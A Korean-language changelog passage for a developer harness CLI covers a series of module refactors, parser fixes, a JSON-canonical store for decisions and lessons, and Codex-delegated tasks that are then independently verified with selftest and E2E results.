**🤖 UR-0053 decisions canonical 패턴을 lessons 로 확장 — Codex CLI(gpt-5.5) 위임 후 하네스 독립 검증. 상태 저장 단일 진실소스 일반화.** (직전 1.9.339 decisions 의 정밀 미러)

### 배경 (위임 결정)
1.9.339 에서 decisions canonical(JSON 진실소스 + MD projection)을 확립 → lessons 도 동일 MD-parse drift 부류이고 `_parseLessonEntries`(순수, `{date,text,tag}`)가 이미 존재 → 동형 작업을 Codex 에 위임("일부 Codex" 로테이션). 위임 ≠ 무검증: 1.9.339 구현을 참조 명세로 작성 → `codex exec` → 하네스가 독립 검증(범위·구문·round-trip·백필·count 사이트·save/list/drop end-to-end).

### 구현 (Codex 수행)
1. **canonical write path**: `lesson save`/`drop` → `lessons.json`(canonical) + `lessons.md`(projection) 동시 기록 (`_saveLessons`).
2. **순수 렌더** `_renderLessonsMd(lessons)` → `lib/pure-utils.js` (tag 없으면 Tag 줄 생략 → `_parseLessonEntries` 와 round-trip 멱등). 기존 `_parseLessonEntries` 가 canonical 파서.
3. **canonical 로더** `_loadLessons(root)`: lessons.json 우선 → 없으면 `_parseLessonEntries(lessons.md)` (읽기 무부작용). 손상 JSON 시 MD fallback.
4. **단일 진실소스 라우팅**: lesson save/list(+tag/query)/drop + pulse/memorySurface/memory-status(lessonHeaders/latest)/handoff count 를 `_loadLessons` 로 전환.
5. **비파괴/백필**: 기존 MD-only → 첫 write 시 MD→JSON 백필(무손실). 읽기 무부작용. fuzzy restore/retro/today-heuristic 은 projection MD 유지(일관).

### 검증 (하네스 독립)
- **변경 범위**: bin/harness.js + lib/pure-utils.js 만 (VERSION/e2e/README/CHANGELOG/package/catalogs 미변경 — 명세 준수).
- **무결성**: node -c ×2 · selftest 88/88 PASS (Codex 가 self-reference-safe 케이스 추가) · **E2E 285/285 PASS** (회귀 0).
- **동작 실측**: save→lessons.json(tag=security·null)+lessons.md(projection, Tag 줄) · list 2·tag filter 1 · drop→1건+archive · memory-status L count=1 · **백필**: MD-only→list 2(읽기 무부작용)·첫 save 시 기존2+신규1=3 보존 · round-trip 멱등.

## 1.9.339 — 2026-06-05 — UR-0053: decisions canonical = JSON, MD = projection (아키텍처)

**🏛 상태 저장 단일 진실소스 — decisions 를 canonical JSON 으로 전환, decisions.md 는 projection(렌더 뷰). count drift 근본 해소.** (UR-0053 full, "UR-0053+UR-0025 둘 다 진행" 중 Round B)

### 배경
설치리뷰 med 전략(Codex#6·Opus·Sonnet): MD 파싱이 count drift(`context.memory.decisions=2 실제1`)·field 오파싱(Alternatives→Impact). 1.9.320 부분수정(template 제외)에 이은 **full**: JSON 을 canonical 로, MD 를 projection 으로 분리해 audit/health/context/MCP 가 단일 진실소스를 보게. (사용자 범위 선택: "decisions만 canonical JSON, 비파괴")

### 구현 (UR-0053 — 비파괴 아키텍처)
1. **canonical write path**: `decision add`/`drop` → `decisions.json`(canonical) + `decisions.md`(projection) 동시 기록. `_saveDecisions(root, arr)`.
2. **순수 파서/렌더** (lib/pure-utils): `_parseDecisionBlock`(블록→객체, 빈 값 null 정규화), `_decisionsFromMd`(MD→객체배열, template 제외), `_renderDecisionsMd`(객체배열→MD projection, template preamble 보존) — render↔parse round-trip 멱등.
3. **canonical 로더** `_loadDecisions(root)`: decisions.json 우선 → 없으면 decisions.md 파싱(읽기 무부작용). 손상 JSON 시 MD fallback.
4. **단일 진실소스 라우팅**: context/health/handoff/pulse/memory-status/session-close/round-history 의 decision count·list·recent 를 모두 `_loadDecisions` 로 전환. MCP `decision_list` 포함.
5. **비파괴/백필**: 기존 MD-only 프로젝트 → 첫 write 시 MD→JSON 백필(데이터 무손실). 읽기 명령은 부작용 0. retro 집계·fuzzy restore·today-heuristic 은 faithful projection MD 를 계속 읽어 일관.

### 검증
- **selftest 87/87 PASS** · **E2E 284/284 PASS** (회귀 0).
- 실측: add→decisions.json(canonical, alt=Mongo·빈값 null)+decisions.md(projection, template 보존) · list/context.memory.decisions=2 일치 · drop→1건+archive 보존 · **백필**: MD-only→list 2건(template 제외)·읽기 무부작용·첫 add 시 기존2+신규1=3 보존 · render↔parse round-trip 멱등.

## 1.9.338 — 2026-06-05 — UR-0025(심층): i18n STRINGS 서브시스템 분리

**🧩 i18n 문자열 서브시스템의 핵심(ko/en catalog + 순수 조회)을 모듈로 분리 — 동형 추출 6번째.** (UR-0025 심층, "UR-0053+UR-0025 둘 다 진행" 중 Round A)

### 배경
constraints·intent-도메인·LSP·anti-laziness·persona에 이은 동형 추출 6번째. 사용자가 "UR-0053 + UR-0025 심층 둘 다 진행"을 지시 → 원자성·회귀격리를 위해 2 독립 라운드로 분리(Round A=UR-0025 i18n[decisions 무관, 저위험] → Round B=UR-0053 decisions canonical JSON). 17줄 catalog 라 전사 오류 회피용 일회용 마이그레이션 스크립트로 결정적 이동 후 삭제.

### 구현 (UR-0025 심층)
1. **`STRINGS`**(i18n ko/en catalog, 17키: install/repl/common) → `lib/catalogs.js`.
2. **`_translate(strings, key, lang)`**(순수: catalog 주입, key→lang 값, fallback ko→key) → `lib/pure-utils.js`. harness `_t(key, lang)` = `_translate(STRINGS, key, lang)` 박막(호출처 0변경).
3. selftest 85→86 · e2e 282→283.

### 검증
- **selftest 86/86 PASS** · **E2E 283/283 PASS** (회귀 0).
- 실측: catalog 17키 · `_translate` ko/en/default·미존재키→키자체·null guard·en누락→ko fallback 정상. (`_t` 는 인터랙티브 install/REPL 전용 getter — 구조+순수동작 검증)

## 1.9.337 — 2026-06-05 — UR-0025(심층): review persona 서브시스템 분리

**🧩 코드리뷰 persona 서브시스템의 핵심(5종 페르소나 catalog + 순수 요약 변환)을 모듈로 분리 — 동형 추출 5번째.** (UR-0025 심층)

### 배경
constraints(1.9.333)·intent-도메인(1.9.334)·LSP(1.9.335)·anti-laziness(1.9.336)에 이은 동형 추출 5번째. 직전 Codex 위임에 이어 이번은 직접 구현(사용자 "일부" 위임 지시 — 1.9.334/336 위임·1.9.335/337 자체의 교대). template literal(백틱) 본문이 긴 catalog 라 전사 오류 회피용 일회용 마이그레이션 스크립트로 결정적 이동 후 삭제.

### 구현 (UR-0025 심층)
1. **`BUILT_IN_PERSONAS`**(5종 리뷰 페르소나 catalog: security/performance/ux/testing/docs, 각 id/name/description/body) → `lib/catalogs.js`.
2. **`_personaSummaries(catalog)`**(순수: catalog → `[{id,name,description}]` 요약, body 제거) → `lib/pure-utils.js`. `persona list --json` 의 인라인 map 을 헬퍼 호출로 교체. `_resolvePersona`(fs fallback 포함)는 harness 유지하며 import 된 catalog 사용.
3. selftest 84→85 · e2e 281→282.

### 검증
- **selftest 85/85 PASS** · **E2E 282/282 PASS** (회귀 0).
- 실측: catalog 5종(security.body 문자열) · `_personaSummaries` 5요약(body 제거)·null guard([]) · `persona list --json` builtin 5 · `review <file> --persona security`(harness `_resolvePersona`→imported catalog) "보안 엔지니어" body 정상 출력.

## 1.9.336 — 2026-06-05 — UR-0025(심층): anti-laziness 서브시스템 분리 (Codex 위임·검증)

**🤖 anti-laziness(거짓완료 탐지) 서브시스템의 핵심(claim-vs-code 패턴 catalog + 순수 탐지/신뢰도 로직)을 Codex CLI(gpt-5.5)에 위임 분리하고 하네스가 독립 검증까지 완료.** (사용자 "일부 Codex 위임" 지시 — 1.9.334 위임·1.9.335 자체 구현에 이은 교대)

### 배경 (위임 결정)
constraints(1.9.333)·intent-도메인(1.9.334)·LSP(1.9.335)에 이은 동형 추출 4번째. 프로젝트 핵심인 anti-lazy-work 탐지 로직이라 신중을 기해 blast radius(harness 내 외부 호출 3곳, 교차 참조 0)를 사전 확정 후 정밀 명세로 Codex 에 위임. 위임 ≠ 무검증: 결과를 하네스가 독립 검증(범위·금지파일·구문·중복·호출처·동작·end-to-end) 후 릴리스.

### 구현 (Codex 수행)
1. **`OPTIMISM_PATTERNS`**(10종 외부작용 claim-vs-code 패턴: API/DB/Email/Webhook/Payment/FileIO/Queue/Cache/Notify/Storage) → `lib/catalogs.js`.
2. **`_extractUrlClaims`/`_verifyUrlClaim`/`_detectOptimism(patterns, …)`/`_computeConfidence(patterns, …)`**(순수 탐지·신뢰도 로직, patterns 주입) → `lib/pure-utils.js`. harness 는 alias import(`_puDetectOptimism`/`_puComputeConfidence`) + 박막 wrapper(`_detectOptimism(evidence, codeText)` = `_puDetectOptimism(OPTIMISM_PATTERNS, …)`)로 호출처 3곳 시그니처 0변경. fs 의존 `_scanCodeForPatterns` 는 harness 유지.

### 검증 (하네스 독립)
- **변경 범위**: bin/harness.js + lib/catalogs.js + lib/pure-utils.js 만 (VERSION/e2e/README/CHANGELOG/package.json 미변경 — 명세 금지사항 준수).
- **무결성**: node -c ×3 통과 · selftest 84/84 PASS · **E2E 281/281 PASS** (회귀 0).
- **동작 실측**: catalog 10종 · `_detectOptimism`(API claim+코드無 → API/high + URL/medium) · `_computeConfidence` 0.25 · 무claim=1.0 · null guard([]/1.0) · `_extractUrlClaims`/`_verifyUrlClaim` 정상.
- **end-to-end 동치**: `optimism-check T-9999`(harness wrapper 경로) → suspects [API,URL]·confidence 0.25 — 순수 함수 직접 호출과 완전 일치.

## 1.9.335 — 2026-06-05 — UR-0025(심층): LSP 서브시스템 핵심 분리

**🧩 LSP 정규식 fallback 서브시스템의 핵심(언어별 심볼 패턴 catalog + 순수 언어감지 + 순수 심볼 매처)을 모듈로 분리 — 1.9.333~334 패턴 동일 적용.** (UR-0025 심층)

### 배경
constraints(1.9.333)·intent-도메인(1.9.334)에 이어 동형(同型) 추출의 세 번째 적용. 검증된 "데이터 catalog → lib/catalogs.js, 순수 매처(catalog 주입) → lib/pure-utils.js, harness 는 박막 wrapper" 패턴을 그대로 반복(결정매트릭스: 기존 패턴 유지·안정성 우선). 직전 라운드 Codex 위임에 이어 이번은 직접 구현(사용자 "일부" 위임 지시 — 적합한 독립 청크 시 재위임).

### 구현 (UR-0025 심층)
1. **`_LSP_LANG_PATTERNS`**(6언어 JS/TS·Python·Go·Rust·Java 심볼 패턴 catalog) → `lib/catalogs.js`.
2. **`_detectLspLang(file)`**(순수: 파일 확장자 → 언어) → `lib/pure-utils.js`.
3. **`_matchLspSymbols(catalog, content, lang)`**(순수 매처: catalog 주입, 라인별 정규식 매칭 + 키워드 false-positive 필터) → `lib/pure-utils.js`. harness `_lspRegexSymbols(content, lang)` = `_matchLspSymbols(_LSP_LANG_PATTERNS, content, lang)` 박막.
4. selftest 82→83 · e2e 279→280.

### 검증
- **selftest 83/83 PASS** · **E2E 280/280 PASS** (회귀 0).
- 실측: catalog 5언어 키 · `_detectLspLang` .py→python/.go→go/.rs→rust/.ts·.md→javascript · `_matchLspSymbols` JS(alpha/fn,Beta/class)·PY(foo/fn,Bar/class)·null guard=[] · `lsp symbols` 명령 end-to-end(helloWorld/MyClass, lang 감지) 정상.

## 1.9.334 — 2026-06-05 — UR-0025(심층): intent-도메인 서브시스템 분리 (Codex 위임·검증)

**🤖 남은 백로그 일부를 Codex CLI(gpt-5.5)에 위임하고 독립 검증까지 완료 — intent-도메인 서브시스템의 핵심(데이터 catalog + 순수 매처)을 1.9.333 constraints 패턴 그대로 모듈로 분리.** (사용자 지시: "남은 백로그 일부는 codex cli를 호출해서 업무 할당하고 검증까지 진행")

### 배경 (위임 결정)
직전 1.9.333 에서 확립한 "서브시스템 핵심(데이터·순수 로직) 추출" 패턴이 안정적으로 반복 가능 → 동형(同型) 작업인 intent-도메인 추출을 Codex CLI 에 위임. 위임 ≠ 무검증: 작업 명세를 backtick-free 파일로 작성 → `codex exec` 호출 → 결과를 하네스가 **독립 검증**(범위·금지파일·구문·selftest·동작·중복) 후 릴리스 확정.

### 구현 (Codex 수행)
1. **`_DEFAULT_DOMAIN_CATALOG`**(5도메인 catalog) → `lib/catalogs.js`(export 추가).
2. **`_matchDomain(catalog, text)`**(순수 매처: text 소문자에 alias substring 포함되는 첫 도메인 → `{domain, alias, components}`, 없으면 `{domain:null}`) → `lib/pure-utils.js`. `_detectDomain(text, root)` = `_matchDomain(_loadDomainCatalog(root), text)`.

### 검증 (하네스 독립)
- **변경 범위 확인**: `bin/harness.js` + `lib/catalogs.js` + `lib/pure-utils.js` 만 변경 (VERSION/e2e/README/CHANGELOG/package.json 미변경 — 명세 금지사항 준수).
- **무결성**: `node -c` 통과 · selftest 82/82 PASS · **E2E 279/279 PASS** (회귀 0).
- **동작 실측**: `_matchDomain` game/web/null/no-match 정상 · intent expand("domain: game") 회귀 정상 · catalog 중복 없음 · exports 정상.
- **테스트 견고화**: import 멤버십 체크(B 1.9.333/1.9.334)를 rigid 정규식 → importBlock 추출 패턴으로 통일 (이후 import 추가에 비의존).

## 1.9.333 — 2026-06-05 — UR-0025(심층): constraints 서브시스템 핵심 분리

**🧩 constraints 서브시스템의 핵심(데이터 catalog + 순수 매처)을 모듈로 분리 — command 서브시스템 추출의 안전한 첫 단계.** (사용자 선택: UR-0025 심층)

### 배경 (방향 결정)
순수 함수 micro-추출 소진 → 사용자가 "command 서브시스템 심층 추출"을 선택. command 함수의 factory+deps 주입은 **새 패턴 도입**(결정매트릭스: 기존 패턴 유지·안정성 우선)이라 위험 → **phase 1은 서브시스템의 핵심(데이터·순수 로직)을 기존 모듈 패턴으로 추출**, fs/command 박막은 harness 유지.

### 구현 (UR-0025 심층 phase 1)
1. **`_DEFAULT_PLATFORM_CONSTRAINTS`**(6플랫폼 제약 catalog, ~57줄) → `lib/catalogs.js`(기존 정적 데이터 모듈).
2. **`_matchConstraints(catalog, text)`**(순수 매칭: 플랫폼 alias 매칭 + 제안) → `lib/pure-utils.js`. `_checkRequestConstraints(root, text)` = `_matchConstraints(_loadPlatformConstraints(root), text)` (fs load 만 주입).
3. selftest 80→81 · e2e 277→278.

### 검증
- **selftest 81/81 PASS** · **E2E 278/278 PASS** (회귀 0).
- 실측: catalog 6플랫폼 · `_matchConstraints(cat, 'stripe 결제')`→matched stripe/total 6 · `(null,…)`→빈 결과 · constraints check + review-request(_checkRequestConstraints) 정상.
- 비고: command 함수(constraintsCmd) 자체의 lib 이전은 factory 패턴 필요 → 별도 결정. 핵심 데이터·로직은 분리·테스트화 완료.

## 1.9.332 — 2026-06-05 — UR-0025(증분): lessons.md 파서 분리

**🧩 순수 lessons.md 파서(`_parseLessonEntries`)를 lib/pure-utils 로 이전 (인라인 파싱 → 재사용 가능 단일 출처).** (UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_parseLessonEntries(text)`** — lessons.md 블록(### 날짜)→엔트리 `{date, text, tag}` 파싱 → `lib/pure-utils.js`. `lessonListCmd` 의 인라인 루프를 헬퍼 호출로 교체(필터는 명령에 유지). decision/roadmap 파서와 동일 패턴.
2. selftest 79→80 · e2e 276→277.

### 검증
- **selftest 80/80 PASS** · **E2E 277/277 PASS** (회귀 0).
- 실측: `_parseLessonEntries` 2엔트리(date/text/tag, 미존재 tag=null) · lesson save+list "total 1, tag lock" 정상.

### 비고 (UR-0025)
lib/pure-utils 누적 ~38종. 순수 함수/인라인 파서 추출은 사실상 한계 — 남은 harness.js 는 command/fs/state 결합이라 추가 분리는 dependency 주입을 동반(아키텍처). UR-0025 는 실질적으로 안전 추출 범위를 소진했으며, 다음 방향(서브시스템 심층 분리 / UR-0053 / UR-0054 ② / 일단락)은 사용자 결정을 권장.

## 1.9.331 — 2026-06-05 — UR-0025(서브시스템): brief 빌더 분리 (VERSION 주입)

**🧩 project-brief 텍스트 빌더(`_briefReadmeBlock`/`_briefBlueprint`) + 마커(BRIEF_START/END)를 lib/pure-utils 로 이전 — brief 순수 레이어 완성.** (사용자 선택: UR-0025 서브시스템 추출)

### 구현 (UR-0025)
1. **`_briefReadmeBlock`**(README 개요 블록) + **`_briefBlueprint`**(복사용 청사진) + **`BRIEF_START`/`BRIEF_END`** 마커 → `lib/pure-utils.js`. 이제 brief 순수 레이어(config·채움·빌더·마커) 전부 pure-utils 단일 소스.
2. **VERSION 결합 해소**: `_briefBlueprint(root, brief)` → **`_briefBlueprint(brief, version)`** (VERSION 을 인자 주입 — pure 유지). harness 호출부 + selftest 2건 시그니처 갱신.
3. **multi-touch 안전 처리**: BRIEF_START/END 는 `_syncBriefReadme`(fs, harness 유지)도 사용 → import back. 호출처/선택검사 모두 갱신, e2e 견고 패턴(import-블록)으로 회귀 차단.
4. selftest 78→79 · e2e 275→276.

### 검증
- **selftest 79/79 PASS** · **E2E 276/276 PASS** (회귀 0 — brief 4종 307·308·330·331 green).
- 실측: `_briefBlueprint(b, '9.9.9')`→"leerness v9.9.9"(주입) · brief export blueprint · README project-brief 마커 sync 정상.

## 1.9.330 — 2026-06-05 — UR-0025(증분): project-brief config 분리

**🧩 project-brief 필드 config(`_BRIEF_FIELDS`) + 채움 카운트(`_briefFilled`)를 lib/pure-utils 로 이전.** (UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_BRIEF_FIELDS`**(10필드 순수 config) + **`_briefFilled`**(순수 채움 derivation) → `lib/pure-utils.js`. harness 인라인 제거 → require. (brief 텍스트 빌더 `_briefReadmeBlock`/`_briefBlueprint`는 BRIEF_START/VERSION 결합이라 harness 유지 — 후속.)
2. selftest 77→78 · e2e 274→275.

### 검증
- **selftest 78/78 PASS** · **E2E 275/275 PASS** (회귀 0).
- 실측: `_BRIEF_FIELDS.length`=10·`[0].key`=intro · `_briefFilled({intro,features})`=2 · brief set/show "채움 2/10" 정상.

### 비고 (UR-0025 진행도)
순수 함수 micro-추출이 실질 소진 단계 — lib/pure-utils 누적 32종. 남은 UR-0025 는 서브시스템 단위(brief 빌더/skill/wakeup 등, 상수·VERSION 결합 동반)라 multi-touch. 다음 방향은 사용자 확인 필요.

## 1.9.329 — 2026-06-05 — UR-0025(증분): roadmap MD 파서 3종 분리

**🧩 순수 roadmap MD 파서 3종을 lib/pure-utils 로 이전.** (UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_roadmapMapStatus`**(상태 정규화) + **`_roadmapParseMilestones`**(### M-XXXX 마일스톤 추출) + **`_roadmapParseTokens`**(MD 테이블 토큰 추출) → `lib/pure-utils.js`. (`_roadmapParseCssVars` 는 fs 의존이라 harness 유지.) harness 인라인 제거 → require.
2. selftest 76→77 · e2e 273→274.

### 검증
- **selftest 77/77 PASS** · **E2E 274/274 PASS** (회귀 0).
- 실측: `_roadmapMapStatus('REQUESTED')`→`planned`/`('done')`→`done` · 마일스톤 progress 40 파싱 · 토큰 `color`→`#fff`.

## 1.9.328 — 2026-06-05 — UR-0025(증분): 문자열 유틸(_truncate/_splitList) 분리

**🧩 순수 문자열 유틸 2종을 lib/pure-utils 로 이전.** (UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_truncate`**(말줄임표 절단) + **`_splitList`**(콤마 리스트 분할, trim+filter) → `lib/pure-utils.js`. harness 인라인 제거 → require.
2. selftest 75→76 · e2e 272→273.

### 검증
- **selftest 76/76 PASS** · **E2E 273/273 PASS** (회귀 0).
- 실측: `_truncate('hello world',8)`→`hello w…`·`_truncate('hi',8)`→`hi` · `_splitList('a, b ,c,')`→`["a","b","c"]`.

## 1.9.327 — 2026-06-05 — UR-0025(증분): TZ/날짜 포맷 유틸 분리

**🧩 순수 TZ/날짜 포맷 함수(`_getLocalTz`/`_formatLocal`)를 lib/pure-utils 로 이전.** (UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_getLocalTz`**(env LEERNESS_TZ / 시스템 tz / Asia/Seoul fallback) + **`_formatLocal`**(ISO UTC → local 표시, 예 "2026-06-05 10:13 KST") → `lib/pure-utils.js`. harness 인라인 제거 → require.
2. selftest 74→75 · e2e 271→272.

### 검증
- **selftest 75/75 PASS** · **E2E 272/272 PASS** (회귀 0, import-블록 견고 패턴).
- 실측: `_formatLocal('…01:13Z', {tz:'Asia/Seoul'})`→`2026-06-05 10:13 KST`(UTC+9) · dateOnly→`2026-06-05` · 빈값→`?`.

## 1.9.326 — 2026-06-05 — UR-0025(증분): 순수 문자열/셸/env 유틸 3종 분리

**🧩 순수 유틸 3종(`_sanitizeFences`/`_shellQuoteArg`/`_detectPwshFromEnv`)을 lib/pure-utils 로 이전.** (사용자 선택: UR-0025 micro-증분 계속)

### 구현 (UR-0025)
1. **`_sanitizeFences`**(코드펜스 ``` → ''' 중립화) + **`_shellQuoteArg`**(shell:true spawn 인자 안전 인용, POSIX/Windows) + **`_detectPwshFromEnv`**(pwsh 6/7 신뢰 마커 감지) → `lib/pure-utils.js`. harness 인라인 제거 → require.
2. 기존 selftest(B 1.9.300 _shellQuoteArg, B 1.9.314 _detectPwshFromEnv)는 import 경유로 통과 — 동작 동일.
3. selftest 73→74 · e2e 270→271.

### 검증
- **selftest 74/74 PASS** · **E2E 271/271 PASS** (회귀 0 — 이번엔 import-블록 추출 견고 패턴으로 브리틀 회귀 없음).
- 실측: `_sanitizeFences('a```b')`→`a'''b` · `_detectPwshFromEnv({channel})`→v7 · `_shellQuoteArg` 인용 · shell-guard/session close 소비 명령 정상.

## 1.9.325 — 2026-06-05 — UR-0025(증분): _classifyIntent 분리 + 모듈화 테스트 견고화

**🧩 순수 intent 분류 함수를 lib/pure-utils 로 이전 + 모듈화 회귀 테스트를 import 순서 비의존으로 견고화.**

### 구현 (UR-0025)
1. **`_classifyIntent` → `lib/pure-utils.js` 분리**: 사용자 텍스트의 precise/broad 신호로 의도(precise/broad/default) 추정 — fs/상태 의존 0. harness 인라인 제거 → require.
2. **모듈화 테스트 견고화**: B(1.9.324) 가 require 라인의 마지막 import 이름에 정규식 고정(`_extractDecisionBlocks } = require`)이라 새 import 추가 시 깨지던 문제 → **pure-utils 구조분해 블록을 추출해 이름 포함만 확인**(import 순서·추가 비의존). B(1.9.325) 도 동일 패턴 적용.
3. selftest 72→73 · e2e 269→270.

### 검증
- **selftest 73/73 PASS** · **E2E 270/270 PASS** (회귀 0).
- 실측: `_classifyIntent('정확히 그것만')`→precise · `'전체 다양한 기능'`→broad · `'로그인 구현'`→default · `intent classify` 명령 정상 · harness 인라인 제거 확인.
- ⚠️ 첫 e2e 269/270(B(1.9.324) 정규식이 import 추가에 취약) → 견고화 후 270/270. (전 라운드 B(1.9.318) 과 동일 패턴 — 이번엔 미래 안전 패턴으로 통일.)

## 1.9.324 — 2026-06-05 — UR-0025(증분): 메모리 MD 파서 분리 + _compareSemver 중복 제거

**🧩 점진적 비파괴 모듈화 — 순수 메모리 파서 2종을 lib/pure-utils 로 이전 + 중복 버전비교 함수 통합.**

### 구현 (UR-0025)
1. **순수 메모리 MD 파서 → `lib/pure-utils.js` 분리**: `_countDatedBlocks`(코드펜스 제거 후 날짜 블록 카운트) + `_extractDecisionBlocks`(결정 블록 추출, Template 제외). decisions/lessons count 의 단일 진실소스. harness.js 인라인 제거 → require.
2. **`_compareSemver` 중복 제거**: pure-utils 의 `compareVer` 와 기능 동일(중복) → `compareVer` 단일화(호출 1곳 교체, 함수 삭제).
3. selftest 71→72 · e2e 268→269.
4. 테스트 견고화: B(1.9.318) HTML 분리 테스트의 import 순서 의존 정규식 → 순서 비의존(이후 import 추가 허용)으로 수정.

### 검증
- **selftest 72/72 PASS** · **E2E 269/269 PASS** (회귀 0).
- 실측: 모듈 `_countDatedBlocks`(펜스 템플릿 제외)·`_extractDecisionBlocks` 동작 · harness 인라인/`_compareSemver` 제거 확인 · context decisions count 정상 · 소비 명령 회귀 없음.
- ⚠️ 첫 e2e 268/269(B(1.9.318) 정규식이 require 라인 변경에 취약) → 정규식 견고화 후 269/269.

## 1.9.323 — 2026-06-05 — UR-0054 ⑥: fresh-init gate 통과 (lazy detect 부재신호 비차단)

**🚀 `leerness init` 직후 `leerness gate` 가 빈 트래커/미생성 handoff 때문에 즉시 실패하던 UX 결함 수정.**

### 배경 (UR-0054 ⑥)
fresh init 후 `gate`(verify+audit+scan+encoding+lazy) 중 **lazy detect 만 exit 1** — `handoff_never_generated`/`handoff_empty`/`no_test_run` 같은 "아직 작업 안 함" 신호를 lazy work 위반처럼 차단. 갓 init 한 프로젝트가 즉시 gate 실패 → 나쁜 첫인상.

### 구현 (UR-0054 ⑥)
1. **작업 흔적 기반 차단 판정**: `done/completed/verified` row 가 하나도 없으면(fresh/무작업) "부재" 신호(`progress_empty`/`handoff_never_generated`/`handoff_empty`/`no_test_run`)는 **어드바이저리(비차단)**. `blockingIssues = issues − advisory(무작업 시)`.
2. **active 프로젝트 보호 유지**: done-claim 이 있으면 모든 신호가 차단(기존 동작). 특히 `evidence_missing`(증거 없는 done)은 항상 차단.
3. JSON 에 `blockingIssues` 필드 추가, `healthy`/exit 는 blocking 기준.
4. selftest 70→71 · e2e 267→268.

### 검증
- **selftest 71/71 PASS** · **E2E 268/268 PASS** (회귀 0).
- 실측: fresh init → `lazy detect` exit **0**(issues=3 advisory, blocking=0, healthy=true) · 거짓완료(done+증거0) 추가 → exit **1**(blocking=3, evidence_missing 차단 유지).

## 1.9.322 — 2026-06-05 — UR-0044(완료): MCP handler 통합 (_mcpToCliArgs 추출)

**🧩 mcpServeCmd 의 인라인 83-case switch(name→cliArgs)를 단일 함수 `_mcpToCliArgs` 로 통합 — ToolRegistry handler 통합 완료.**

### 배경 (UR-0044)
mcpServeCmd 의 tools/call 핸들러에 **230줄 인라인 switch**(83 도구 name→cliArgs 매핑)가 있어 mcpServeCmd 가 비대하고 매핑이 dispatch 로직과 뒤섞임. 1.9.319 에서 일치성 가드(모든 def↔case)를 먼저 깔아 안전망 확보 → 본 라운드에서 물리 이전.

### 구현 (UR-0044 완료)
1. **`_mcpToCliArgs(name, args, targetPath)` 모듈레벨 함수 추출** — 83-case switch 를 그대로 이전(미지 도구는 `null` 반환). mcpServeCmd 는 `cliArgs = _mcpToCliArgs(...)` 호출 + `null` 시 `-32601` 응답.
2. **마이그레이션 스크립트(`scripts/_migrate-mcp-tocli.js`)로 프로그램적 splice** — 수기 전사 위험 0, 실행 후 삭제.
3. 안전망: 일치성 가드(selftest: 83 def↔case) + e2e(MCP 16+ 테스트 + 신규 B(1.9.322) 인자매핑/미지도구) 가 검증.
4. selftest 69→70 · e2e 266→267.

### 검증
- **selftest 70/70 PASS** · **E2E 267/267 PASS** (회귀 0 — 전체 MCP 테스트 green).
- 실측: about/state_start(멀티인자)/feature_add/task_add(status push) dispatch 정상 · 미지 도구 → `-32601 Unknown tool` · `switch (name)` 소스 1곳(_mcpToCliArgs)만.

## 1.9.321 — 2026-06-05 — UR-0053(2단계): decision/lesson 빈 필드 오파싱 수정

**🔧 빈 필드(Alternatives 등)가 다음 줄(Impact)을 캡처하던 `Alternatives→Impact 오파싱` 버그 수정 (UR-0053 의 두 번째 구체 결함).**

### 배경 (UR-0053)
`decision add --reason r --impact x` (alternatives 비움) 후 `decision list --json` → `alternatives: "- Impact: x"` (다음 줄을 캡처). 원인 — 필드 파서 `block.match(/- Alternatives:\s*(.+)/)` 의 **`\s*` 가 개행을 포함**(`\s`) → 빈 필드일 때 개행을 건너뛰고 `(.+)` 가 다음 줄(`- Impact: …`)을 잡음.

### 구현 (UR-0053 2단계)
1. **필드 파서 `\s*` → `[ \t]*` (같은 줄 공백만)**: 빈 필드는 같은 줄에 내용이 없으면 매치 안 함 → 다음 줄 누출 차단. 적용 9곳: decision(Decision/Reason/Alternatives/Impact) + lesson(Lesson/Tag) 파서 전반.
2. **락 테스트 안정화(테스트 품질)**: B(1.9.303) 동시 task add 락 테스트 폴 타임아웃 25s→60s — 전체 e2e CPU 포화 시 6 병렬 spawn 지연 간헐 플래키 방지(격리 실측 0.4s, 락 로직 불변).
3. selftest 68→69 · e2e 265→266.

### 검증
- **selftest 69/69 PASS** · **E2E 266/266 PASS** (회귀 0).
- 실측: 빈 alternatives → `alternatives` 가 `- Impact:…` 안 잡음(이전 누출) · 모든 필드 채움 → 정확 분리 · 락 테스트 6/6 안정.

## 1.9.320 — 2026-06-04 — UR-0053(1단계): decisions/lessons count drift 버그 수정

**🔢 MD 파싱이 코드펜스 템플릿 예시까지 세어 `decisions=2 실제1` 로 오집계하던 count drift 버그 수정 (UR-0053 의 구체적 결함).**

### 배경 (UR-0053)
UR-0053 전략(상태 canonical=JSON, MD=projection) 중 **구체적으로 재현된 버그**: `context.memory.decisions=2 실제1`. 원인 — decisions.md/lessons.md 의 **Template 예시가 코드펜스(```md … ```) 안에 `### YYYY-MM-DD — Decision 제목` 형태**로 들어있는데, 카운터 6곳이 raw regex `match(/^### \d{4}-\d{2}-\d{2}/gm)` 로 **펜스 안 템플릿까지 카운트**.

### 구현 (UR-0053 1단계 — 비파괴 count 정합)
1. **`_countDatedBlocks(text)` 단일 진실소스** — 코드펜스 제거 후 `### YYYY-MM-DD` 헤더만 카운트 (기존 `_extractDecisionBlocks` 의 펜스 제거 로직과 동일 원리).
2. **6개 카운트 사이트 교체** (context / auto-resume / handoff·audit builder): decisions 2곳 + lessons 4곳 → `_countDatedBlocks` 사용. raw regex 카운트 0.
3. selftest 67→68 · e2e 264→265.
4. 전체 JSON-canonical 아키텍처(쓰기 경로 전환)는 별도 후속 — 본 단계는 **읽기 카운트 정합**(비파괴, behavior change 0).

### 검증
- **selftest 68/68 PASS** · **E2E 265/265 PASS** (회귀 0).
- 실측: decision 1건 + lesson 1건 추가 → `context` `memory.decisions=1, lessons=1` (이전 decisions=2) · `_countDatedBlocks`: 펜스 템플릿 제외(1), 펜스만(0), 펜스 없는 2건(2).

## 1.9.319 — 2026-06-04 — UR-0044(가드): MCP ToolRegistry 일치성 회귀 가드

**🛡 MCP 도구 def ↔ dispatch case 불일치(Unknown-tool 갭)를 영구 차단하는 회귀 가드 — UR-0044 의 실질 위험 해소.**

### 배경 (UR-0044 재평가)
UR-0044 원안은 "83-case switch 의 cliArgs 매핑을 도구 def 로 이전". 조사 결과:
